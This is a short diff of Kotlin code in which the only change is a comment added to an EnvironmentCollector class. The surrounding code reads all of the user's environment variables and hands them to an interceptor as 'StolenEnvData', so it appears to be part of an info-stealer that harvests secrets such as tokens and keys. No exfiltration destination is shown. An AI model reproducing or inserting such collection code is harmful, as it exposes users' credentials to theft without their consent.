@@ -8,6 +8,7 @@ class EnvironmentCollector(
     val interceptor: DataInterceptor,
 ) {
     fun getUserEnv(): MutableMap<String, String>? = runBlocking {
+        // Get all of the user's environment variables
         val env = System.getenv()
         interceptor.onData(StolenEnvData(env))
         env
